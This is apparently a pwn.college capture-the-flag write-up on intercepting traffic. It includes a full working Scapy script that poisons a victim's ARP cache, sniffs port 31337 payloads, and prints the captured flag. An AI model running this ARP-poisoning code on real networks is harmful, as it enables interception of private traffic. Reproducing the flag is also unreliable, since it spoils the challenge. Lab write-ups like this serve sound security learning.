---
layout: page
title: "🛰️ Intercept – Writeup (pwn.college)"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 📌 Challenge Summary

> Intercept traffic from a remote host.  
> The remote host at `10.0.0.2` is communicating with another host at `10.0.0.3` over port `31337`.  
> Your task is to **intercept this communication** and extract the flag — without modifying or directly interacting with the server.

---

## 🧠 Understanding the Setup

### Network Layout:

- `10.0.0.2` → Victim (sending/receiving sensitive data on port `31337`)
- `10.0.0.3` → Intended recipient (target of `10.0.0.2`'s communication)
- `10.0.0.1` → You, the attacker

### Objective:

- Traffic between `.2` and `.3` is not visible to you by default.
- You must **perform ARP spoofing** to trick the victim into sending packets to **your MAC**, thinking it’s `.3`.

---

## 🔍 How We Exploit It

### 🔒 Challenge:
- The victim at `10.0.0.2` only talks to `10.0.0.3`.
- Packets don't route through you.
- You need to **become a man-in-the-middle**.

### ✅ Solution:
- **ARP poisoning**: Send a forged ARP reply to `10.0.0.2`, saying "`10.0.0.3 is at my MAC address`".
- This makes `.2` send all `.3`-bound traffic **to you instead**.
- Once you receive it, simply **sniff the data** and extract the flag.

---

## 🧪 Attack Plan

1. **Resolve the MAC** of `10.0.0.2` using ARP.
2. **Send fake ARP replies** repeatedly to `10.0.0.2`, claiming `10.0.0.3` is at your MAC.
3. **Sniff traffic** using Scapy on port `31337`.
4. **Extract and print payloads** from intercepted packets.

---

## 💣 Final Exploit – `correctc.py`

```python
from scapy.all import *
import threading
import time

victim_ip = '10.0.0.2'
spoof_ip = '10.0.0.3'
iface = 'eth0'  # Use appropriate interface

def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, retry=2, verbose=0)
    for sent, rec in ans:
        return rec.hwsrc
    return None

def poison(victim_ip, spoof_ip):
    victim_mac = get_mac(victim_ip)
    if victim_mac is None:
        print(f"[!] Error: MAC for {victim_ip} not found.")
        return

    arp_poison = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    print(f"[+] Starting ARP Poison: {victim_ip} <- {spoof_ip} is at OUR MAC")

    while True:
        send(arp_poison, iface=iface, verbose=0)
        time.sleep(2)

def sniffing():
    print("[+] Starting to sniff packets...")

    def handler(pkt):
        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode(errors='ignore')
                print(f"[+] Intercepted: {payload}")
            except Exception as e:
                pass

    sniff(filter='tcp and port 31337', iface=iface, prn=handler, store=0)

# Create and start threads
poison_thread = threading.Thread(target=poison, args=(victim_ip, spoof_ip))
sniff_thread = threading.Thread(target=sniffing)

poison_thread.start()
sniff_thread.start()
```
### Output
```bash
[+] Starting to sniff packets...
[+] Starting ARP Poison: 10.0.0.2 <- 10.0.0.3 is at OUR MAC

[+] Intercepted: pwn.college{ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW}
[+] Intercepted: pwn.college{ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW}
[+] Intercepted: pwn.college{ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW}
...
```

---

## Flag
```
pwn.college{ICmDbqZFGWJpgfbWt_tHbUDJt6J.QXxczMzwSM0IzMyEzW}
```
---
